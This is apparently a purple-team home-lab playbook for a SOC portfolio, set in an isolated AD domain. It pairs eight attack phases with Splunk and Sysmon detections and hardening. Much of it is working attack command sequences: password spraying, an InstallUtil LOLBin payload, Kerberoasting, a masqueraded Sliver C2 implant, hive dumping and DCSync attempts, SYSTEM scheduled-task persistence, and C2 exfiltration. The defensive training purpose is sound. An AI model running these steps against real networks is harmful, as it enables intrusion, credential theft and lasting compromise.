**English** · **[Srpski](02_attack_playbook.sr.md)**

# Purple Team Home Lab — Attack Playbook

**Project:** Purple LAB — SOC Analyst Level 2
**Goal:** Document the attack phases to drive defensive detection engineering
**Deliverable:** CV/portfolio for a cybersecurity (SOC L2) position

---

## PURPLE TEAM CONTEXT NOTE

This documents all 8 attack phases, run in an isolated lab environment **strictly for blue-team training**. Every phase is mapped to the MITRE ATT&CK framework. Each phase has matching detection logic in Document 3.

**Defender stays enabled throughout the lab** — a realistic enterprise scenario.

**The primary deliverable is the GitHub repo** (README + detections-as-code) — that is what a hiring manager scans in ~2 minutes. **The video series is an optional deep-dive:** 8 attack segments (1 phase = 1 segment) + Seg 9 Splunk Dashboard Tour + Seg 10 Production Hardening (bonus). Recommended ~1h highlight cut: Seg 4, 6, 8, 9, 10.

---

## 8-PHASE OVERVIEW

| # | Phase | Tooling | MITRE | Status |
|---|---|---|---|---|
| 1 | Reconnaissance | nmap, kerbrute, nxc, certipy | T1046, T1087, T1018 | ✅ Works |
| 2 | Password Spraying | kerbrute | T1110.003 | ✅ Works |
| 3 | Execution (LOLBins) | InstallUtil.exe + .NET payload | T1218.004 | ✅ Works |
| 4 | Kerberoasting | impacket-GetUserSPNs | T1558.003 | ✅ Works |
| 5 | Lateral Movement | Sliver C2 mTLS | T1071.001 | ✅ Works |
| 6 | Credential Dumping | reg save SAM/SYSTEM, secretsdump | T1003.002/.005/.006 | ✅ Local works, ❌ DCSync failed (AMSI + DRS bind) |
| 7 | Persistence | schtasks (LogonTrigger) | T1053.005 | ✅ Works |
| 8 | C2 + Exfiltration | Sliver mTLS port 443 | T1071.001, T1041 | ✅ Works (evasion successful) |

---

## PHASE 1 — RECONNAISSANCE

**MITRE:** T1046 (Network Service Discovery), T1087 (Account Discovery), T1018 (Remote System Discovery)

### Goal
Identify AD infrastructure, users, open services, and AD CS misconfigurations before the attack.

### Commands (from Kali, terminal)

```bash
# 1.1 Network sweep
nmap -sV 192.168.182.0/24

# 1.2 SMB enumeration of the DC (port 445 may be blocked from Kali → expect timeout)
nmap -p 445 --script smb-os-discovery 192.168.182.135

# 1.3 NetExec SMB enumeration
nxc smb 192.168.182.135

# 1.4 NetExec LDAP enumeration (port 389 works)
nxc ldap 192.168.182.135 -u '' -p '' --users

# 1.5 Kerbrute — userenum (port 88 works)
echo -e "Administrator\nSQLService\ntstark\nfcastle\npparker\nGuest\nfrankcastle\npeterparker" > /tmp/users.txt
./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users.txt

# 1.6 BloodHound enumeration (with the compromised account)
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135

# 1.7 ASREPRoast check (anyone with pre-auth disabled?)
impacket-GetNPUsers MARVEL.LOCAL/ -dc-ip 192.168.182.135 -no-pass -usersfile /tmp/users.txt

# 1.8 AD CS discovery (critical — Certipy)
certipy-ad find -u fcastle@MARVEL.LOCAL -p Password1 -dc-ip 192.168.182.135
```

### Expected results

- 5 live hosts (DC, 2x Win10, Kali, Splunk)
- LDAP enumeration: MARVEL.LOCAL user list
- Kerbrute confirms which users exist
- BloodHound dump JSON files for visualization
- ASREPRoast: no user is vulnerable (all have pre-auth)
- **Certipy findings:**
  - CA: MARVEL-HYDRA-DC-CA
  - 33 templates, 11 enabled
  - **ESC1, ESC2, ESC3, ESC15 on the SubCA template**
  - ESC4 on several templates

### Commands that do NOT work (and why)

- `impacket-secretsdump` directly against the DC → port 445 blocked ❌
- `certipy-ad req` ESC1 exploitation → port 135 RPC blocked ❌
- `certipy-ad relay` → web enrollment disabled ❌

### What the narration says

> "Before I fire, I scout. What exists on the network, which users, which services, which privileges. Certipy shows me AD CS has 4 ESC vulnerabilities — but the firewall blocks exploitation. I leave that for the blue-team narrative — 'how to defend against it'."

---

## PHASE 2 — PASSWORD SPRAYING

**MITRE:** T1110.003 (Password Spraying)

### Goal
Find an account with a weak password — one password across all accounts, so each account gets exactly one failed attempt and the lockout policy never triggers.

### Pre-spray (recon)

**Important for the narrative — recommended step:** Check the lockout policy first.

```bash
# If you have any account, check the policy:
nxc smb 192.168.182.135 -u fcastle -p Password1 --pass-pol
```

### Commands

```bash
# 2.1 Prepare the user list (only accounts confirmed in Phase 1)
cat > /tmp/users_clean.txt << EOF
Administrator
SQLService
fcastle
frankcastle
peterparker
pparker
Guest
EOF

# 2.2 SPRAY — we avoid lockout with ONE password per account, NOT with delay.
# --delay is in milliseconds (100ms) — just throttling, nothing to do with lockout.
# Lockout would only trigger if we hit the same account multiple times.
./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users_clean.txt 'Password1' --delay 100

# Result:
# [+] VALID LOGIN: fcastle@MARVEL.LOCAL:Password1
```

### Expected Splunk events

- **EC4771** — Kerberos pre-auth failed (all failed attempts)
- **EC4768** — TGT issued (when Password1 succeeds for fcastle)
- **EC4625** — Account failed to log on (if kerbrute falls back to NTLM)

### What the narration says

> "Spray, not brute force. One password across all accounts. It's quiet — I don't lock accounts. fcastle fell to Password1 — a classic."

---

## PHASE 3 — EXECUTION (LOLBins)

**MITRE:** T1218.004 (InstallUtil), T1059 (Command and Scripting Interpreter)

### Goal
Run a payload through a Microsoft-signed binary (InstallUtil.exe) instead of powershell.exe directly. Less suspicious, bypasses some AV policies.

### Payload prep (from Kali)

```bash
# 3.1 Create a .NET install payload with Mono mcs
cat > /tmp/Punisher.cs << 'EOF'
using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Punisher : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Execution starts here when InstallUtil /U is called
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\pwned.txt && hostname >> C:\\Temp\\pwned.txt");
    }
}
EOF

# 3.2 Compile with Mono mcs
mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
```

### Delivery and execution (on THEPUNISHER)

```powershell
# 3.3 Fetch the payload over the SMB share (Kali SMB server must be running)
copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll

# 3.4 Run via InstallUtil (LOLBin)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
```

### Expected result

- `C:\Temp\pwned.txt` created with `whoami` and `hostname` output
- Sysmon EC1 shows the parent-child chain: InstallUtil.exe → cmd.exe → whoami.exe
- EC4688 with command line `InstallUtil.exe`

### Defender behavior

- Defender does **NOT block** InstallUtil — it is a Microsoft-signed binary
- Defender does **NOT block** GlobalProtect_Update.dll because it is in the `C:\Temp` exclusion path
- AMSI does **NOT block** because InstallUtil does not go through the PowerShell AMSI scan

### What the narration says

> "I don't use powershell.exe — I use InstallUtil.exe. It's a Microsoft-signed Windows binary. Defender trusts it. My payload looks like a DLL being installed. A classic T1218 LOLBin attack."

---

## PHASE 4 — KERBEROASTING

**MITRE:** T1558.003 (Kerberoasting)

### Goal
Extract the TGS hash of a service account with an SPN, crack it offline to recover the password.

### Commands (from Kali)

```bash
# 4.1 GetUserSPNs — find all accounts with an SPN
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request

# Result:
# $krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.LOCAL/SQLService*$xxx...

# 4.2 Save the hash to a file
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes

# 4.3 Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force

# Result: MYpassword123#
```

### Expected Splunk events

- **EC4769** — Kerberos service ticket requested
  - **Ticket Encryption Type: 0x17 (RC4-HMAC)** — the key indicator!
  - Account: fcastle (request from)
  - Service: SQLService@MARVEL.LOCAL

### What the narration says

> "RC4 encryption in a Kerberos response is a red flag. Modern Windows requests AES by default. RC4 means — someone knows what they're doing. The SQLService account has a weak password. 17 seconds for hashcat to crack it."

---

## PHASE 5 — LATERAL MOVEMENT (Sliver C2)

**MITRE:** T1071.001 (Web Protocols), T1572 (Protocol Tunneling)

### Goal
Establish a persistent C2 channel with THEPUNISHER as the domain-joined platform for attacks against the DC.

### Sliver server setup (from Kali)

```bash
# 5.1 Start the Sliver server
sudo sliver-server
```

Inside the Sliver console:
```
# 5.2 Set up an mTLS listener on port 443
mtls --lport 443

# 5.3 Generate a Windows implant
generate --mtls 192.168.182.133:443 --os windows --arch amd64 --format exe --save /tmp/

# Output: /tmp/INTENSIVE_WARLOCK.exe (Sliver assigns a random codename per build)
```

### Prepare delivery (Kali, second terminal)

```bash
# 5.4 Rename the implant (recommended — legitimate name = masquerading)
sudo cp /tmp/INTENSIVE_WARLOCK.exe /tmp/share/GlobalProtect_Update.exe

# 5.5 Start the SMB share
sudo impacket-smbserver share /tmp/share -smb2support
```

### Execution on THEPUNISHER (via Sliver shell or manually)

```cmd
copy \\192.168.182.133\share\GlobalProtect_Update.exe C:\Temp\GlobalProtect_Update.exe
C:\Temp\GlobalProtect_Update.exe
```

### Session verification (Sliver console)

```
sessions
use <session_id>
whoami
pwd
```

### Lateral test — check connectivity to the DC

```
# From the Sliver shell:
shell
```

```powershell
Test-NetConnection -ComputerName 192.168.182.135 -Port 445
Test-NetConnection -ComputerName 192.168.182.135 -Port 135
ping 192.168.182.135
```

### Expected Splunk events

- **Sysmon EC1** — Process Create: `GlobalProtect_Update.exe`
- **Sysmon EC3** — Network Connect: 192.168.182.133:443 (only if the process is on the watchlist — not caught by default)
- **EC4688** — `GlobalProtect_Update.exe` started

### What the narration says

> "Sliver is a modern C2 — it uses mTLS on port 443. The filename GlobalProtect_Update.exe looks like a Palo Alto VPN update. Sysmon doesn't catch this by default — which is exactly what I'll fix in the blue-team part."

---

## PHASE 6 — CREDENTIAL DUMPING

**MITRE:** T1003.002 (SAM), T1003.005 (Cached Domain Credentials), T1003.006 (DCSync — attempted, failed)

### Goal
Extract local and cached domain credentials from the compromised machine.

### Commands (from the Sliver shell)

```powershell
# 6.1 Establish an SMB connection to the DC (for potential follow-on attacks)
net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1

# 6.2 Save registry hives locally
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive

# 6.3 Copy to Kali over SMB
copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
copy C:\Temp\system.hive \\192.168.182.133\share\system.hive
copy C:\Temp\security.hive \\192.168.182.133\share\security.hive
```

### Extraction (from Kali)

```bash
sudo impacket-secretsdump -sam /tmp/share/sam.hive -system /tmp/share/system.hive -security /tmp/share/security.hive LOCAL
```

### What you get

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435...:fbdcd5041c96ddbd82224270b57f11fc:::
frankcastle:1001:aad3b435...:64f12cddaa88057e06a81b54e73b949b:::
SUPERMAN:1002:aad3b435...:2b576acbe6bcfda7294d6bd18041b8fe:::

[*] Dumping cached domain logon information
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f

[*] Dumping LSA Secrets
$MACHINE.ACC:aad3b435...:d770bd67e3abc0203eff3c20cf595db2
dpapi_machinekey:0x57a7e865c5b2fb91eef0506730aed4ccbb6938e0
NL$KM:1f523cfbda5fdb429fb1a2b324c1eca0...
```

### DCSync — attempted, FAILED

```powershell
# 6.4 Mimikatz DCSync (BLOCKED BY AMSI)
C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
# Result: "This script contains malicious content and has been blocked by your antivirus software"

# 6.5 SharpKatz alternative (AMSI-evading, compiled .NET)
C:\Temp\SharpKatz.exe --Command dcsync --User krbtgt --Domain MARVEL.LOCAL --DomainController 192.168.182.135
# Result: "Error: 1825 - Error DC bind with default Guid" (RPC_S_SEC_PKG_ERROR)
# Reason: Kerberos/auth error at the DRS bind (transport layer), NOT access-denied.
#         fcastle IS a Domain Admin and DOES hold replication rights (nested BUILTIN\Administrators).
```

### Blue-team narrative — conclusion

**DCSync never succeeded — but NOT because of permissions:**
1. Defender + AMSI blocked the Mimikatz PowerShell invocation (a known tool, cut before execution)
2. SharpKatz (AMSI-evading) passed AV, but failed at the DRS bind — RPC 1825, a Kerberos/auth error at the transport layer

**Why this is a stronger blue-team story than "no privileges":**
- AMSI stops the **tool**, not the **technique** — that is the control that actually worked
- fcastle is a Domain Admin (nested `BUILTIN\Administrators`) and **DOES hold** `DS-Replication-Get-Changes` / `-All` — privilege was never the barrier
- The control that would actually detect DCSync is SACL auditing — EC4662 with replication GUIDs (visibility, not prevention)
- The durable fix is **least privilege** — tiering admin accounts (Tier 0 isolation) so a compromised endpoint-admin can't reach a DA and abuse replication rights, not relying on AV signatures → Lab v2

### Expected Splunk events

- **EC4688** with command line `reg.exe save HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` — critical indicator
- **EC4688** with `net.exe use \\192.168.182.135\IPC$` — auth attempt against the DC
- **Defender Operational log (EC1116/1117)** — Mimikatz signature blocks
- **Sysmon EC11** — File Create for sam.hive, system.hive, security.hive
- **EC4662** with replication GUIDs — the DCSync signature (requires SACL auditing on the DC)

### What the narration says

> "reg save SAM — that's the trace every SOC analyst should see. Defender doesn't block reg.exe because it's a legitimate Windows tool. But the combination of `save` + `SAM/SYSTEM/SECURITY` — that's a red alarm."

---

## PHASE 7 — PERSISTENCE

**MITRE:** T1053.005 (Scheduled Task/Job)

### Goal
Establish persistence — keep the implant alive after reboot.

### Commands (from the Sliver shell)

```powershell
# 7.1 Pre-flight — confirm audit policy captures task creation
auditpol /get /subcategory:"Other Object Access Events"
# If "No Auditing":
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

# 7.2 Create a scheduled task — LogonTrigger
schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.exe" /sc onlogon /ru SYSTEM /f

# 7.3 Verify
schtasks /query /tn "WindowsUpdateService"
```

### Persistence test

```powershell
# Logoff/logon or reboot — the task will launch the implant
# If using Sliver, you'll see a new session in the console
```

### Expected Splunk events

- **EC4698** — Scheduled Task Created
  - Task Name: `\WindowsUpdateService`
  - Author: `THEPUNISHER\frankcastle`
  - Command: `C:\Temp\GlobalProtect_Update.exe`
  - Trigger: `LogonTrigger`
  - Principal: `S-1-5-18` (SYSTEM)

### What the narration says

> "A scheduled task with a logon trigger, running as SYSTEM. That's a classic persistence pattern. EC4698 in Splunk captures this with the full XML content — task name, command path, principal."

---

## PHASE 8 — C2 + EXFILTRATION

**MITRE:** T1071.001 (Web Protocols), T1041 (Exfiltration Over C2 Channel)

### Goal
Demonstrate ongoing C2 communication and exfiltration over the Sliver mTLS channel.

### Setup

Sliver C2 has been running since Phase 5. Beaconing goes to port 443 toward Kali.

### Exfiltration test (from the Sliver console)

```
# 8.1 From the compromised machine, collect loot
shell
```

```powershell
# Create a fake "sensitive" file
echo "Top secret data: customer database backup" > C:\Temp\loot.txt
exit
```

```
# 8.2 Exfiltrate over the Sliver channel
download C:\Temp\loot.txt
```

### C2 beaconing analysis

Sliver beacon patterns:
- Default interval: 60 seconds
- Jitter: 30%
- Protocol: mTLS on port 443
- Destination IP: 192.168.182.133 (Kali)
- Process: `GlobalProtect_Update.exe`

### Expected Splunk events (KEY for the blue-team narrative)

**Default Sysmon config does NOT capture Sliver beaconing** because NetworkConnect is not enabled for processes from user-writable paths (default Sysmon doesn't log every outbound connect).

```spl
# This query will NOT show Sliver
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
  dst_port=443
```

**Detection iteration — behavioral, NOT by filename:**

The naive fix would be to add `GlobalProtect_Update.exe` to a watchlist. That's an anti-pattern —
the attacker renames the binary and the detection dies. We detect **location + behavior**,
not the name: any process from a user-writable path that initiates egress.

```xml
<NetworkConnect onmatch="include">
  <!-- any process from a user-writable path making a network connection -->
  <Image condition="contains">\Temp\</Image>
  <Image condition="contains">\AppData\</Image>
  <Image condition="contains">\ProgramData\</Image>
  <Image condition="contains">\Users\Public\</Image>
</NetworkConnect>
```

After restarting Sysmon, re-run the implant — Splunk captures EC3 with the Kali destination.
Fidelity is raised by beacon-interval analysis (Sliver default 60s ± 30%), not the process name.
The vendor-agnostic version is Sigma rule 7 in `detections/sigma/sigma_rules.yml`.

### What the narration says

> "This is the purple-team point. Sliver runs, beaconing runs, but default Sysmon does NOT log its network connect. The gap is not in the filename — that's the trap. If I key the detection on the name `GlobalProtect_Update.exe`, the attacker renames the binary and I'm blind. So I detect location and behavior: any process from a user-writable path that reaches the network, plus beacon-interval analysis. That's the difference between an L1 IOC and L2 behavioral detection."

---

## EXECUTION ORDER FOR RECORDING

### Pre-flight (5 min)

1. ✅ Power on all VMs
2. ✅ Run the validation script on all Windows machines
3. ✅ Verify Splunk forwarder connectivity
4. ✅ Start the Sliver server, mTLS listener, SMB share

### Recording — FINAL STRUCTURE (10 segments)

**Principle:** 1 phase = 1 segment. Phase 8 is the climax (the purple-team detection-engineering moment). Seg 10 is the bonus that separates an L2 from an L1 candidate.

**Context:** CV/portfolio for a cybersecurity position, NOT YouTube retention. Shorter is better — a hiring manager scans 2-3 min per video.

#### Full series (10 segments)

| # | Segment | Phase | Duration | Status |
|---|---|---|---|---|
| 1 | Lab Setup & Recon | Phase 1 | 15-20 min | Core |
| 2 | Password Spraying | Phase 2 | 10-12 min | Core |
| 3 | LOLBin Execution | Phase 3 | 10-12 min | Core |
| 4 | Kerberoasting | Phase 4 | 12-15 min | Core |
| 5 | Lateral Movement / Sliver C2 | Phase 5 | 15 min | Core |
| 6 | Credential Dumping | Phase 6 | 12-15 min | Core |
| 7 | Persistence | Phase 7 | 10-12 min | Core |
| 8 | C2 Evasion & Detection Engineering | Phase 8 | 12-15 min | Core (CLIMAX) |
| 9 | Splunk Dashboard Tour | — | 15 min | Core |
| 10 | Production Hardening: Closing the Gaps | — | 15-20 min | Bonus |

**Total: ~2h 15min – 2h 45min**

#### CV minimum (5 segments — recommended for the first pass)

| # | Segment | Duration | Why |
|---|---|---|---|
| 4 | Kerberoasting | 12-15 min | AD-specific, RC4 detection |
| 6 | Credential Dumping | 12-15 min | Defender/AMSI win — blue-team flex |
| 8 | C2 Evasion & Detection Engineering | 12-15 min | Climax, detection-engineering depth |
| 9 | Splunk Dashboard Tour | 10-12 min | Where a hiring manager jumps straight |
| 10 | Production Hardening | 15-20 min | L2 vs L1 differentiator |

**Total: ~1h – 1h 17min**

---

**Segment 1 — Lab Setup & Recon (15-20 min) — Phase 1**
- Lab architecture walkthrough (MARVEL.LOCAL topology)
- All recon commands (nmap, kerbrute, nxc, certipy, BloodHound)
- AD CS ESC findings — Certipy
- Splunk dashboard baseline review

**Segment 2 — Password Spraying (10-12 min) — Phase 2**
- Pre-spray recon (lockout policy check)
- kerbrute passwordspray with --delay 100
- Splunk detection EC4771/4768/4625
- Live dashboard update

**Segment 3 — LOLBin Execution (10-12 min) — Phase 3**
- InstallUtil.exe T1218.004
- Why Defender doesn't block a Microsoft-signed binary
- AMSI doesn't cover the InstallUtil path
- Sysmon EC1 parent-child chain analysis

**Segment 4 — Kerberoasting (12-15 min) — Phase 4**
- impacket-GetUserSPNs via the Sliver shell
- hashcat offline crack
- **SQLService description anti-pattern wisdom drop** (central point)
- Splunk detection EC4769 (TGS request)

**Segment 5 — Lateral Movement / Sliver C2 (15 min) — Phase 5**
- Sliver server, mTLS listener, payload generate
- Deployment over the SMB share
- Network pivot — from THEPUNISHER to DC port 445/135
- Why mTLS defeats enterprise TLS inspection

**Segment 6 — Credential Dumping (12-15 min) — Phase 6**
- SAM/SYSTEM/SECURITY hive dump (reg save)
- DCSync attempt: AMSI blocks Mimikatz, SharpKatz fails at RPC 1825 (DRS bind, not permissions)
- **Blue-team win narrative** — AMSI stopped the tool; least privilege is the durable fix (not "permissions saved us")
- EC1116/1117 Defender events

**Segment 7 — Persistence (10-12 min) — Phase 7**
- schtasks LogonTrigger /ru SYSTEM
- Masquerading discipline (WindowsUpdateService)
- 4 event sources for T1053.005 detection
- Splunk EC4698 with XML parsing

**Segment 8 — C2 Evasion & Detection Engineering (12-15 min) — Phase 8 [CLIMAX]**
- Sliver beaconing analysis (60s + jitter)
- **Default Sysmon does NOT catch Sliver** — the purple-team gap
- Live demo: adding a C:\Temp watchlist to Sysmon NetworkConnect
- Restart Sysmon → EC3 now works
- **This is the central point of the whole series** — emulate, detect, gap, iterate

**Segment 9 — Splunk Dashboard Tour (15 min)**
- Walkthrough of all 8 detections via the dashboard
- MITRE ATT&CK mapping visualization
- Lessons learned + threat-hunting next steps

**Segment 10 — Production Hardening: Closing the Gaps (15-20 min) — BONUS**

The complete hardening playbook (attack → fix → re-run proof) is in `03_detection_playbook.md`. Summary of the 4 demos:

| Phase | Attack | Hardening Fix | Verification |
|---|---|---|---|
| 2 | Password Spray fcastle:Password1 | Fine-Grained Password Policy + lockout 5/30min + strong reset | Kerbrute fail + EC4740 lockout |
| 4 | Kerberoasting SQLService RC4 | AES256 enforcement + 23-char password + description cleanup | hashcat estimate 47 years + EC4769 enc_type=0x12 |
| 5 | Sliver implant from C:\Temp | AppLocker Deny rule for user-writable paths | "Blocked by group policy" + EC8004 |
| 8 | mTLS C2 beacon on 443 | Sysmon NetworkConnect watchlist (GPO deployment) | EC3 captures the beacon from C:\Temp |

**Closing insight (CENTRAL POINT):** Hardening ≠ Detection. All four attacks are either blocked or detected, but no single control is bulletproof. Spray can go low-and-slow. AppLocker can be bypassed via a signed LOLBin. The Sysmon watchlist misses anything outside C:\Temp. Detection is the safety net for everything that gets through the prevention layer.

---

## TROUBLESHOOTING DURING THE ATTACK

### Sliver session drops

```bash
# Check whether the Sliver server is alive
sudo ss -tlnp | grep 443

# If the port is held by an old process:
sudo kill -9 <PID>
sudo sliver-server
```

### SMB server drops

```bash
# Check
sudo ss -tlnp | grep 445

# Restart
sudo kill -9 <PID>
sudo impacket-smbserver share /tmp/share -smb2support
```

### Defender deletes the implant

- Confirm `C:\Temp` is in the exclusion path (GPO)
- If not, add manually (lab only):
```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
```

### Splunk not capturing events

- Restart the forwarder: `Restart-Service SplunkForwarder`
- Check inputs.conf
- Confirm audit policy is enabled for the relevant subcategory

---

**End of Document 2**
**Next:** `03_detection_playbook.md` — Detection Cards in MITRE format for all 8 phases + the Production Hardening playbook
